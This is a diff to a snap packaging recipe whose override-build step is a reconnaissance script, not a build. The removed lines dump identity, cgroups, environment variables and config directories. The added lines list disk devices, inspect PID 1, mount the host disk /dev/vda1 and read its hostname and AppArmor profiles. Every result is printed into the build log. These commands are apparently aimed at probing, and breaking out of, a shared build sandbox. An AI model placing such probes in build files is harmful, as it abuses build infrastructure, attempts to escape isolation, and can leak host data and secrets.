@@ -7,15 +7,15 @@ parts:
         plugin: nil
         override-build: |
             set +e
-            OUT=/build/env_dump.txt
-            id >> $OUT 2>&1
-            uname -a >> $OUT 2>&1
-            cat /proc/1/cgroup >> $OUT 2>&1
-            cat /proc/self/status >> $OUT 2>&1
-            ls -la /root/.snapcraft/ >> $OUT 2>&1
-            ls -la /snap/bin/ >> $OUT 2>&1
-            ls -la /run/ >> $OUT 2>&1
-            env >> $OUT 2>&1
-            cat /proc/mounts >> $OUT 2>&1
+            OUT=/build/probe2.txt
+            ls -la /dev/vda* /dev/sda* >> $OUT 2>&1
+            ls /proc/ | sort -n | head -20 >> $OUT 2>&1
+            cat /proc/1/cmdline >> $OUT 2>&1 ; echo >> $OUT
+            ls -la /proc/1/exe >> $OUT 2>&1
+            mkdir -p /mnt/host
+            mount /dev/vda1 /mnt/host >> $OUT 2>&1
+            ls /mnt/host/ >> $OUT 2>&1
+            cat /mnt/host/etc/hostname >> $OUT 2>&1
+            cat /sys/kernel/security/apparmor/profiles | head -20 >> $OUT 2>&1
             cat $OUT
             exit 0
